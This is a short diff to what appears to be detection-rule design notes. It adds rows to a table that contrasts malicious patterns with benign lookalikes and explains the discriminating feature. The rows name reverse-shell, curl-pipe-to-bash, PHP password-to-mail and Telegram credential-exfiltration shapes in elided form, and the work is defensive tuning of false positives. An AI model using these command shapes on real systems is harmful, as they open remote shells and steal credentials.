@@ -67,7 +67,10 @@ its surface features but not its intent:
 | `bash -i >& /dev/tcp/...` | `/dev/tcp` port-check + `ssh -i <keyfile>` | fullword `sh -i` atom — `ssh -i` contains the substring but not the token |
 | `curl http://<ip> \| bash` | rustup-style `curl https://host \| sh` | raw-IP-over-http source |
 | `$_POST['password']` → `mail(attacker)` | same-origin login handler | the outbound exfil, not the capture |
+| `$_REQUEST[ 'password' ]` → `mail(attacker)` | account-settings update, no outbound mail | the outbound exfil (capture regex tolerates spacing + superglobal swap) |
+| `$_GET['password']` → `mail(attacker)` | gated-download passphrase check, no outbound mail | the outbound exfil, not the query-string capture |
 | Telegram API carrying creds | Telegram API carrying deploy status | credential context |
+| Telegram API carrying `login:`/`otp:` | Telegram API posting a "new login" sign-in alert | the key:value credential shape, not the bare word `login` |
 
 ## The harness
 
